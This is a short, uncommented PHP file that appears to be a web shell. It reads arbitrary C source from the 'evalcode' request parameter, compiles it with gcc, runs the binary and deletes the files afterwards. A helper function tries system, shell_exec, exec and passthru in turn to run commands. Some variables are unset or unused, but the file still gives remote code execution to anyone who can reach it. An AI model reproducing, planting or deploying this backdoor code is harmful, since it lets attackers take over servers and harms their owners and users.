<?php
function exe($c){
	$out = "";
	$c = $c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		system($c);
		$out = ob_get_contents();
		ob_end_clean();
	}
	elseif(is_callable('shell_exec'))
		$out = shell_exec($c);
	elseif(is_callable('exec')) 
		exec($c,$r);	
	elseif(is_callable('passthru')) {
		ob_start();
		passthru($c);
		$out = ob_get_contents();
		ob_end_clean();
	}
	return $out;
}

$code = $_REQUEST['evalcode'];
$script = md5(time().rand(0,100));
chdir($tmpdir);
file_put_contents($script.".c", $code);
	
$scriptout = $script.".exe";
$res = exe("gcc ".$script.".c -o ".$scriptout);
					
$res = exe("chmod +x ".$scriptout." ; ./".$scriptout);
rename($scriptout, $scriptout."del");
unlink($scriptout."del");

unlink($script.".c");
die("");				
?>